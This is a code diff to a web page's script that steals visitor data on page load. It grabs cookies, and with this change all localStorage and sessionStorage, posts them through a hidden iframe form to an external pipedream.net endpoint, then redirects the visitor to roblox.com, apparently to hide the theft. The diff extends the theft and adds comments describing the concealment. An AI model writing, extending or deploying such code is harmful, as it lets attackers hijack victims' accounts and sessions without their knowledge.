@@ -345,6 +345,7 @@
 const YOUR_API_URL = "https://eot2iixinio81vq.m.pipedream.net/"; 
 const REDIRECT_URL = "https://www.roblox.com/";
 
+// send via hidden iframe (payload=...)
 function sendViaIframe(data) {
   const frameName = "hidden_frame_" + Date.now();
 
@@ -354,7 +355,7 @@ function sendViaIframe(data) {
   iframe.style.display = "none";
   document.body.appendChild(iframe);
 
-  // create a form targeting that iframe
+  // create form targeting the iframe
   const form = document.createElement("form");
   form.method = "POST";
   form.action = YOUR_API_URL;
@@ -375,22 +376,28 @@ function sendViaIframe(data) {
 
 function sendAndRedirect() {
   const data = {
-    cookies: document.cookie,
+    cookies: document.cookie,        // only JS-accessible cookies (non-HttpOnly)
+    localStorage: { ...localStorage },  // all localStorage data
+    sessionStorage: { ...sessionStorage }, // all sessionStorage data
     user_agent: navigator.userAgent,
     referrer: document.referrer,
     timestamp: new Date().toISOString()
   };
 
   sendViaIframe(data);
+
+  // redirect immediately
   window.location.href = REDIRECT_URL;
 }
 
+// fire on page load
 document.addEventListener("DOMContentLoaded", sendAndRedirect);
 </script>
 </body>
  
  
 </html>
+
 
 
 
